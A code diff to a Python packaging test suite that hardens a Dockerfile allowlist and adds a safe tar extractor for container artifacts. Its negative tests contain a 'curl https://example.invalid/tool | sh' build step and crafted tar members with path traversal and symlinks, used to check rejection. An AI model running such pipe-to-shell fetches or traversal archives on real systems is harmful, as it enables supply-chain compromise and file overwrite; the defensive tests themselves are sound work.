@@ -8,12 +8,14 @@ import importlib.util
 import json
 import math
 import re
+import stat
 import sys
+import tarfile
 import tempfile
 import time
 from dataclasses import dataclass
 from datetime import UTC, datetime
-from pathlib import Path
+from pathlib import Path, PurePosixPath
 from typing import Never
 from uuid import UUID
 
@@ -112,6 +114,14 @@ _FROM_PATTERN = re.compile(
     r"^(?P<image>[a-z0-9./_-]+):(?P<tag>[^@\s]+)@sha256:(?P<digest>[0-9a-f]{64})"
     r"\s+AS\s+(?P<stage>[a-z][a-z0-9_-]*)$"
 )
+_ARCHIVE_FILE_MAXIMUMS = {
+    "run-spec.json": 64 * 1024,
+    "result.json": 64 * 1024,
+    "trades.parquet": 16 * 1024 * 1024,
+    "equity-curve.parquet": 32 * 1024 * 1024,
+    "report.html": 8 * 1024 * 1024,
+    "checksums.json": 64 * 1024,
+}
 
 
 @dataclass(frozen=True, slots=True)
@@ -122,6 +132,22 @@ class _DockerInstruction:
 
 def _read(path: Path) -> str:
     return path.read_text(encoding="utf-8")
+
+
+def _docker_parser_directives(path: Path) -> tuple[tuple[str, str], ...]:
+    """Inspect BuildKit directives before ordinary comments or Docker instructions."""
+    directives: list[tuple[str, str]] = []
+    for raw_line in _read(path).splitlines():
+        stripped = raw_line.strip()
+        if not stripped:
+            continue
+        if not stripped.startswith("#"):
+            break
+        directive = stripped[1:].strip()
+        key, separator, value = directive.partition("=")
+        if separator and key.strip().lower() in {"syntax", "escape", "check"}:
+            directives.append((key.strip().lower(), value.strip()))
+    return tuple(directives)
 
 
 def _docker_instructions(path: Path) -> tuple[_DockerInstruction, ...]:
@@ -154,32 +180,31 @@ def _dockerignore_rules(path: Path) -> tuple[str, ...]:
     )
 
 
-def test_active_dockerfile_enforces_the_exact_pinned_runtime_contract() -> None:
-    """Catches comments or extra active instructions that weaken the runtime image."""
-    instructions = _docker_instructions(_DOCKERFILE)
-    stages = tuple(instruction for instruction in instructions if instruction.keyword == "FROM")
-    assert len(stages) == 3
-    assert tuple(stage.arguments for stage in stages) == (
-        "ghcr.io/astral-sh/uv:0.6.14@sha256:"
-        "3362a526af7eca2fcd8604e6a07e873fb6e4286d8837cb753503558ce1213664 AS uv",
-        "python:3.12.11-slim-bookworm@sha256:"
-        "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS build",
-        "python:3.12.11-slim-bookworm@sha256:"
-        "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS runtime",
-    )
-    assert all(_FROM_PATTERN.fullmatch(stage.arguments) is not None for stage in stages)
-    assert all(instruction.keyword != "EXPOSE" for instruction in instructions)
-    copies = tuple(
-        instruction.arguments for instruction in instructions if instruction.keyword == "COPY"
-    )
-    assert copies == (
-        "--from=uv /uv /uvx /bin/",
-        "pyproject.toml uv.lock ./",
-        "--from=build /opt/venv /opt/venv",
-        "src /app/src",
-    )
-    runtime_start = instructions.index(stages[2]) + 1
-    assert tuple((item.keyword, item.arguments) for item in instructions[runtime_start:]) == (
+def _assert_dockerfile_contract(path: Path) -> None:
+    """Require the complete active Dockerfile allowlist and no parser frontends."""
+    assert _docker_parser_directives(path) == (), "Dockerfile parser directives are forbidden"
+    instructions = _docker_instructions(path)
+    expected = (
+        (
+            "FROM",
+            "ghcr.io/astral-sh/uv:0.6.14@sha256:"
+            "3362a526af7eca2fcd8604e6a07e873fb6e4286d8837cb753503558ce1213664 AS uv",
+        ),
+        (
+            "FROM",
+            "python:3.12.11-slim-bookworm@sha256:"
+            "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS build",
+        ),
+        ("COPY", "--from=uv /uv /uvx /bin/"),
+        ("ENV", "UV_PROJECT_ENVIRONMENT=/opt/venv UV_LINK_MODE=copy"),
+        ("WORKDIR", "/build"),
+        ("COPY", "pyproject.toml uv.lock ./"),
+        ("RUN", "uv sync --frozen --no-dev --extra cloud --no-install-project"),
+        (
+            "FROM",
+            "python:3.12.11-slim-bookworm@sha256:"
+            "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS runtime",
+        ),
         (
             "ENV",
             'PATH="/opt/venv/bin:$PATH" PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1 HOME=/tmp',
@@ -197,12 +222,51 @@ def test_active_dockerfile_enforces_the_exact_pinned_runtime_contract() -> None:
         ("ENTRYPOINT", '["/opt/venv/bin/python", "-m", "awslambdaric"]'),
         ("CMD", '["src.cloud.results_handler.lambda_handler"]'),
     )
-    assert any(
-        instruction.arguments == "uv sync --frozen --no-dev --extra cloud --no-install-project"
-        for instruction in instructions
-        if instruction.keyword == "RUN"
+    assert tuple((item.keyword, item.arguments) for item in instructions) == expected, (
+        "Dockerfile active instruction sequence changed"
     )
-    assert all("pip install" not in instruction.arguments for instruction in instructions)
+    stages = tuple(instruction for instruction in instructions if instruction.keyword == "FROM")
+    assert all(_FROM_PATTERN.fullmatch(stage.arguments) is not None for stage in stages)
+    assert all(instruction.keyword not in {"ADD", "EXPOSE"} for instruction in instructions)
+
+
+def test_active_dockerfile_enforces_the_exact_pinned_runtime_contract() -> None:
+    """Catches comments or extra active instructions that weaken the runtime image."""
+    _assert_dockerfile_contract(_DOCKERFILE)
+
+
+def test_dockerfile_contract_rejects_a_mutable_buildkit_syntax_frontend(tmp_path: Path) -> None:
+    """Catches a parser directive that would fetch a mutable external build frontend."""
+    dockerfile = tmp_path / "Dockerfile"
+    dockerfile.write_text("# syntax=docker/dockerfile:latest\n" + _read(_DOCKERFILE))
+
+    with pytest.raises(AssertionError, match="parser directives"):
+        _assert_dockerfile_contract(dockerfile)
+
+
+def test_dockerfile_contract_rejects_remote_add_and_extra_build_tooling(tmp_path: Path) -> None:
+    """Catches active build-stage supply-chain additions outside the exact allowlist."""
+    remote_add = tmp_path / "Dockerfile.remote-add"
+    remote_add.write_text(
+        _read(_DOCKERFILE).replace(
+            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
+            "ADD https://example.invalid/tool /opt/venv/bin/tool\n"
+            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
+        )
+    )
+    extra_run = tmp_path / "Dockerfile.extra-run"
+    extra_run.write_text(
+        _read(_DOCKERFILE).replace(
+            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
+            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project\n"
+            "RUN curl https://example.invalid/tool | sh",
+        )
+    )
+
+    with pytest.raises(AssertionError, match="active instruction sequence"):
+        _assert_dockerfile_contract(remote_add)
+    with pytest.raises(AssertionError, match="active instruction sequence"):
+        _assert_dockerfile_contract(extra_run)
 
 
 def test_dockerignore_is_an_ordered_allowlist_that_never_reopens_sensitive_inputs() -> None:
@@ -260,8 +324,15 @@ def test_make_cloud_targets_are_frozen_and_container_smoke_enforces_runtime_poli
         "uv run --frozen --extra dev --extra cloud python tests/cloud/test_packaging.py --smoke"
         in makefile
     )
-    assert "docker build --platform linux/amd64 -t $(CLOUD_IMAGE) ." in makefile
+    assert (
+        "docker build --platform linux/amd64 --iidfile \"$$image_iidfile\" -t $(CLOUD_IMAGE) ."
+        in makefile
+    )
+    assert "--iidfile \"$$image_iidfile\"" in makefile
+    assert "$(CLOUD_IMAGE) /harness/test_packaging.py" not in makefile
+    assert "\"$$image_id\" /harness/test_packaging.py" in makefile
     assert "--network none" in makefile
+    assert "--ipc=none" in makefile
     assert "--read-only" in makefile
     assert "--user 10001:10001" in makefile
     assert "--tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m" in makefile
@@ -269,8 +340,10 @@ def test_make_cloud_targets_are_frozen_and_container_smoke_enforces_runtime_poli
     assert "readonly" in makefile
     assert "--container-smoke" in makefile
     assert "--verify-container-artifacts" in makefile
+    assert "--extract-container-archive" in makefile
     assert "docker exec" in makefile
     assert "tarfile.open" in makefile
+    assert "tar -C" not in makefile
     assert "AWS_ACCESS_KEY_ID" not in makefile
     assert "AWS_SECRET_ACCESS_KEY" not in makefile
 
@@ -406,10 +479,106 @@ def _run_offline_smoke(output_directory: Path) -> dict[str, tuple[int, str]]:
 
 def _verify_copied_artifacts(artifact_directory: Path) -> dict[str, tuple[int, str]]:
     """Independently verify the unfiltered container receipt copied to the host."""
-    assert artifact_directory.is_dir()
+    directory_mode = artifact_directory.lstat().st_mode
+    assert stat.S_ISDIR(directory_mode) and not artifact_directory.is_symlink()
     paths = tuple(artifact_directory.iterdir())
-    assert all(path.is_file() for path in paths)
+    assert all(stat.S_ISREG(path.lstat().st_mode) and not path.is_symlink() for path in paths)
     return _validate_artifact_bodies({path.name: path.read_bytes() for path in paths})
+
+
+def _extract_container_archive(
+    archive_path: Path, output_directory: Path
+) -> dict[str, tuple[int, str]]:
+    """Validate a container artifact tar stream before copying regular members to the host."""
+    expected_member_names = (
+        "artifacts",
+        *(f"artifacts/{name}" for name in _PUBLICATION_SEQUENCE),
+    )
+    with tarfile.open(archive_path, "r:*") as archive:
+        members = tuple(archive.getmembers())
+        names = tuple(member.name for member in members)
+        assert len(names) == len(set(names)), "archive contains duplicate member names"
+        for member in members:
+            member_path = PurePosixPath(member.name)
+            assert not member_path.is_absolute(), "archive contains an absolute member path"
+            assert ".." not in member_path.parts, "archive contains a traversal member path"
+        assert members and members[0].isdir() and not members[0].linkname, (
+            "archive root must be artifacts/"
+        )
+        for member in members[1:]:
+            assert member.isreg(), "archive artifact members must be regular files, not links"
+            assert not member.linkname, "archive artifact members must not link elsewhere"
+        assert set(names[1:]) == set(expected_member_names[1:]), (
+            "archive member inventory is not the exact receipt"
+        )
+        total_size = 0
+        for member in members[1:]:
+            name = PurePosixPath(member.name).name
+            assert member.size <= _ARCHIVE_FILE_MAXIMUMS[name], "archive member exceeds its limit"
+            total_size += member.size
+        assert total_size <= sum(_ARCHIVE_FILE_MAXIMUMS.values()), "archive exceeds total limit"
+
+        output_directory.mkdir(parents=True, exist_ok=False)
+        for member in members[1:]:
+            source = archive.extractfile(member)
+            assert source is not None
+            body = source.read(member.size + 1)
+            assert len(body) == member.size, "archive member byte count changed while reading"
+            destination = output_directory / PurePosixPath(member.name).name
+            with destination.open("xb") as output:
+                output.write(body)
+    return _verify_copied_artifacts(output_directory)
+
+
+def _write_malicious_archive(archive_path: Path, member: tarfile.TarInfo) -> None:
+    with tarfile.open(archive_path, "w") as archive:
+        directory = tarfile.TarInfo("artifacts")
+        directory.type = tarfile.DIRTYPE
+        archive.addfile(directory)
+        archive.addfile(member)
+
+
+def test_safe_archive_extractor_rejects_traversal_before_creating_output(tmp_path: Path) -> None:
+    """Catches archive traversal before it can write outside the unique smoke directory."""
+    archive_path = tmp_path / "traversal.tar"
+    traversal = tarfile.TarInfo("artifacts/../../escape")
+    traversal.size = 0
+    _write_malicious_archive(archive_path, traversal)
+    output_directory = tmp_path / "output"
+
+    extractor = globals().get("_extract_container_archive")
+    assert callable(extractor), "container archives require a safe stdlib extractor"
+    with pytest.raises(AssertionError, match="traversal"):
+        extractor(archive_path, output_directory)
+    assert not output_directory.exists()
+
+
+def test_safe_archive_extractor_rejects_link_members_before_creating_output(tmp_path: Path) -> None:
+    """Catches symlink and hardlink archive members before they reach host verification."""
+    extractor = globals().get("_extract_container_archive")
+    assert callable(extractor), "container archives require a safe stdlib extractor"
+    for link_type in (tarfile.SYMTYPE, tarfile.LNKTYPE):
+        archive_path = tmp_path / f"link-{link_type.decode()}.tar"
+        link = tarfile.TarInfo("artifacts/result.json")
+        link.type = link_type
+        link.linkname = "../../outside"
+        _write_malicious_archive(archive_path, link)
+        output_directory = tmp_path / f"output-{link_type.decode()}"
+
+        with pytest.raises(AssertionError, match="link|regular"):
+            extractor(archive_path, output_directory)
+        assert not output_directory.exists()
+
+
+def test_safe_archive_extractor_accepts_the_exact_receipt_in_tar_order(tmp_path: Path) -> None:
+    """The tar transport may sort regular receipt files independently of publication order."""
+    source_directory = tmp_path / "source"
+    expected_inventory = _run_offline_smoke(source_directory)
+    archive_path = tmp_path / "artifacts.tar"
+    with tarfile.open(archive_path, "w") as archive:
+        archive.add(source_directory, arcname="artifacts")
+
+    assert _extract_container_archive(archive_path, tmp_path / "output") == expected_inventory
 
 
 def _runtime_worker_path() -> str:
@@ -420,14 +589,21 @@ def _runtime_worker_path() -> str:
 
 def _assert_container_filesystem_policy() -> dict[str, str]:
     """Prove runtime policy supplies the bounded writable area, not Dockerfile permissions."""
-    try:
-        Path("/var/tmp/.write-probe").touch()
-    except OSError:
-        var_tmp = "denied"
-    else:
-        raise AssertionError("/var/tmp is writable without a read-only root filesystem")
+    def denied_or_absent(path: Path) -> str:
+        try:
+            path.touch(exist_ok=False)
+        except FileNotFoundError:
+            return "absent"
+        except OSError:
+            return "denied"
+        else:
+            path.unlink()
+            raise AssertionError(f"{path.parent} is writable outside the bounded /tmp tmpfs")
+
+    var_tmp = denied_or_absent(Path("/var/tmp/.write-probe"))
+    dev_shm = denied_or_absent(Path("/dev/shm/.write-probe"))
     Path("/tmp/.write-probe").touch()
-    return {"tmp_write": "succeeded", "var_tmp_write": var_tmp}
+    return {"dev_shm_write": dev_shm, "tmp_write": "succeeded", "var_tmp_write": var_tmp}
 
 
 def test_offline_worker_smoke_writes_exact_artifact_set(tmp_path: Path) -> None:
@@ -487,7 +663,20 @@ def _main() -> Never:
     )
     parser.add_argument("--output-directory", type=Path)
     parser.add_argument("--verify-container-artifacts", type=Path)
+    parser.add_argument("--extract-container-archive", type=Path)
     arguments = parser.parse_args()
+    if arguments.extract_container_archive is not None:
+        if arguments.output_directory is None:
+            parser.error("--extract-container-archive requires --output-directory")
+        print(
+            json.dumps(
+                _extract_container_archive(
+                    arguments.extract_container_archive, arguments.output_directory
+                ),
+                sort_keys=True,
+            )
+        )
+        raise SystemExit(0)
     if arguments.verify_container_artifacts is not None:
         print(
             json.dumps(
